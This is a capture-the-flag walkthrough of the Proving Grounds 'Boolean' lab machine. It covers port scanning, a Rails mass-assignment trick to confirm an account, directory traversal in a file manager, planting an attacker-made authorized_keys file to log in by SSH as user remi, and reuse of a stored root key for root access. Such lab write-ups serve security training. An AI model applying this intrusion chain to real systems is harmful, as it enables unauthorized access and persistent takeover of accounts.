---
layout: default
title: Boolean
parent: Proving Grounds Practice - Linux
nav_order: 13
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/boolean]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.192.231

Nmap scan report for 192.168.192.231

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

80/tcp    open  http
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest, GetRequest, HTTPOptions:
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|_    Content-Length: 0
| http-title: Boolean
|_Requested resource was http://192.168.192.231/login
33017/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Development
|_http-server-header: Apache/2.4.38 (Debian)

```

# Enumeration

---

## 80 | HTTP

The default page is a simple login.

![login](../../../assets/images/ctfs/proving_grounds/boolean/login.png)

If we create an account we can login and land on this _/register/confirmation_ page.

![confirmation](../../../assets/images/ctfs/proving_grounds/boolean/confirmation.png)

Intercepting the edit request in Burp we can evaluate the parameters in the response header.

The JSON object contains a _confirmed_ field with the value of "false".

![false](../../../assets/images/ctfs/proving_grounds/boolean/false.png)

# Exploitation

---

We can leverage the Rails "Mass Assignment" vulnerability by changing the value supplied in the response header from "user[email]=email_address" to "user[confirmed]=true".

[Here is a writeup on Mass Assignment Vulnerabilty](https://guides.rubyonrails.org/v2.3.11/security.html#mass-assignment)

If we change the value in the request header we can see the response header reflects the change to "confirmed:true"

![true](../../../assets/images/ctfs/proving_grounds/boolean/true.png)

When we refresh the Confirmation page we are provided the File Manager page with an upload option.

![upload](../../../assets/images/ctfs/proving_grounds/boolean/upload.png)

Upload a test file to see the behavior

![test](../../../assets/images/ctfs/proving_grounds/boolean/test.png)

If we manipulate the _cwd_ parameter in the URL we have directory traveral ability.

![dir](../../../assets/images/ctfs/proving_grounds/boolean/dir.png)

We see that we are in the directory path of the user _remi_

![remit](../../../assets/images/ctfs/proving_grounds/boolean/remit.png)

We discover a .ssh directory and the ability to upload files to this directory.

![ssh](../../../assets/images/ctfs/proving_grounds/boolean/ssh.png)

Let's generate a public key and rename to _authorized_keys_ and upload to the .ssh directory of the user _remi_

```bash
# Generate key SSH key pair in the current directory
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/boolean]
└─$ ssh-keygen -q -N '' -f sshkey

# Now rename the public key to authorized_keys
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/boolean]
└─$ mv sshkey.pub authorized_keys

```

We now have the _authorized_keys_ file upload and ready to use to SSH as _remi_

![authorized](../../../assets/images/ctfs/proving_grounds/boolean/authorized.png)

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/boolean]
└─$ ssh -i sshkey remi@192.168.192.231
The authenticity of host '192.168.192.231 (192.168.192.231)' can't be established.
ED25519 key fingerprint is SHA256:eTG4NrU6OUZPVXOLLTYv8t/tCRLp9jupV23MLshPn4k.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.192.231' (ED25519) to the list of known hosts.
Linux boolean 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
remi@boolean:~$ id
uid=1000(remi) gid=1000(remi) groups=1000(remi)

```

# Post-Exploitation

---

## Check for aliases

```bash
remi@boolean:~$ compgen -a
ls
root

```

List the _root_ alias

```bash
remi@boolean:/tmp$ alias
alias ls='ls --color=auto'
alias root='ssh -l root -i ~/.ssh/keys/root 127.0.0.1'

```

Using the IdentitiesOnly option with a boolean value true or yes will force SSH to explicitly use the identity specified in the command line.

```bash
remi@boolean:/tmp$ ssh -l root -i ~/.ssh/keys/root 127.0.0.1 -o IdentitiesOnly=true
Linux boolean 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@boolean:~# id
uid=0(root) gid=0(root) groups=0(root)

```
